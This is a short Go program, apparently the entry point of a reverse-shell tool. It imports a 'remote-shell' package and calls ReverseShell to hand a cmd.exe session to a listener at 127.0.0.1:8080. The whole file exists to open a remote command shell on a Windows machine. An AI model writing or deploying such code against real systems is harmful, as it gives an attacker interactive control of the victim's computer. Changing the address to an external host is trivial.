package main 
import "remote-shell/src/Modes" 
func main(){ 
	Modes.ReverseShell("127.0.0.1:8080", "cmd.exe", nil)
}
